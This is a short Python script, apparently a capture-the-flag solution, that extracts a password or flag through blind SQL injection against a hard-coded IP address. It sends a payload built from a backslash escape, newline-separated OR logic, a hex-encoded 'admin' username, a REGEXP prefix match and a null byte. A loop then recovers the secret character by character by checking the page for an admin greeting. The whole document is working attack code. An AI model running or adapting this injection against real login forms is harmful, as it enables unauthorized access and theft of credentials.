import requests
import string

url="http://49.4.68.67:89/"
payload="?user=\&pw=%0A||user%0Aregexp%0A0x61646d696e%26%26pw%0AREGEXP%0A%22^{}%22;%00"
guess = string.digits+string.letters

flag=""

for i in range(30):
  print "[+]round: "+str(i)
  for j in guess: 
    tmp=flag+j
    sub=url+payload.format(tmp)
    print "[+]"+sub
    re = requests.get(sub)
    if "<h2>Bonjour!, admin</h2>" in re.text:
      flag = flag+j
      break
  print flag
